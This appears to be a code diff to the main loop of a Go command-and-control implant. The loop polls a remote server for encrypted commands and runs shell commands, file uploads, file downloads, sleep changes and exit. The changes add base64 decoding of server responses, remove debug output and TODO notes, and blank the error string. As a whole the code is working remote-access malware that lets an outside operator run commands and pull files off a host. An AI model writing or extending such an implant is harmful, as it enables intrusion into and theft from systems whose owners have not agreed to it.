@@ -2,7 +2,7 @@ package main
 
 import (
 	"bytes"
-	"fmt"
+	"encoding/base64"
 	"io"
 	"os"
 	"strings"
@@ -22,32 +22,27 @@ func main() {
 		for {
 			resp := transports.PullCommand()
 			if resp != nil {
-				totalLen := resp.Response().ContentLength
+				decoded_body, _ := base64.RawURLEncoding.DecodeString(string(resp.Bytes()))
+				totalLen := len(decoded_body)
 				if totalLen > 0 {
-					hmacHash := resp.Bytes()[totalLen-cryptography.HmacHashLen:]
-					fmt.Printf("hmac hash: %v\n", hmacHash)
-					//TODO check the hmachash
-					restBytes := resp.Bytes()[:totalLen-cryptography.HmacHashLen]
-					decrypted := transports.DecryptPacket(restBytes)
-					timestamp := decrypted[:4]
-					fmt.Printf("timestamp: %v\n", timestamp)
+					respBytes := decoded_body[:totalLen-cryptography.HmacHashLen]
+					decrypted := transports.DecryptPacket(respBytes)
 					lenBytes := decrypted[4:8]
-					packetLen := transports.ReadInt(lenBytes)
+					transportsLen := transports.ReadInt(lenBytes)
 
 					decryptedBuf := bytes.NewBuffer(decrypted[8:])
 					for {
-						if packetLen <= 0 {
+						if transportsLen <= 0 {
 							break
 						}
-						cmdType, cmdBuf := transports.ParsePacket(decryptedBuf, &packetLen)
+						cmdType, cmdBuf := transports.ParsePacket(decryptedBuf, &transportsLen)
 						if cmdBuf != nil {
 							switch cmdType {
-							//shell
 							case commands.CMD_TYPE_SHELL:
 								shellPath, shellBuf := commands.ParseCommandShell(cmdBuf)
 								result := commands.Shell(shellPath, shellBuf)
-								finalPaket := transports.MakePacket(0, result)
-								transports.PushResult(finalPaket)
+								finalPacket := transports.MakePacket(0, result)
+								transports.PushResult(finalPacket)
 
 							case commands.CMD_TYPE_UPLOAD_START:
 								filePath, fileData := commands.ParseCommandUpload(cmdBuf)
@@ -61,13 +56,10 @@ func main() {
 
 							case commands.CMD_TYPE_DOWNLOAD:
 								filePath := cmdBuf
-								//TODO encode
 								strFilePath := string(filePath)
 								strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
 								fileInfo, err := os.Stat(strFilePath)
 								if err != nil {
-									//TODO notify error to c2
-									//packet.processError(err.Error())
 									break
 								}
 								fileLen := fileInfo.Size()
@@ -81,7 +73,6 @@ func main() {
 
 								fileHandle, err := os.Open(strFilePath)
 								if err != nil {
-									//packet.processErrorTest(err.Error())
 									break
 								}
 								var fileContent []byte
@@ -113,9 +104,7 @@ func main() {
 
 							case commands.CMD_TYPE_SLEEP:
 								sleep := transports.ReadInt(cmdBuf[:4])
-								//jitter := packet.ReadInt(cmdBuf[4:8])
-								//fmt.Printf("Now sleep is %d ms, jitter is %d\n",sleep,jitter)
-								constants.WaitTime = time.Duration(sleep) * time.Millisecond
+								constants.SleepTime = time.Duration(sleep) * time.Millisecond
 
 							case commands.CMD_TYPE_PWD:
 								pwdResult := commands.GetCurrentDirectory()
@@ -124,22 +113,20 @@ func main() {
 
 							case commands.CMD_TYPE_EXIT:
 								os.Exit(0)
-
 							default:
-								errIdBytes := transports.WriteInt(0) // must be zero
-								arg1Bytes := transports.WriteInt(0)  // for debug
+								errIdBytes := transports.WriteInt(0)
+								arg1Bytes := transports.WriteInt(0)
 								arg2Bytes := transports.WriteInt(0)
-								errMsgBytes := []byte("An error has occured...")
+								errMsgBytes := []byte("")
 								result := utilities.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
-								finalPaket := transports.MakePacket(31, result)
-								transports.PushResult(finalPaket)
+								finalPacket := transports.MakePacket(31, result)
+								transports.PushResult(finalPacket)
 							}
 						}
 					}
 				}
 			}
-			time.Sleep(constants.WaitTime)
+			time.Sleep(constants.SleepTime)
 		}
 	}
-
 }
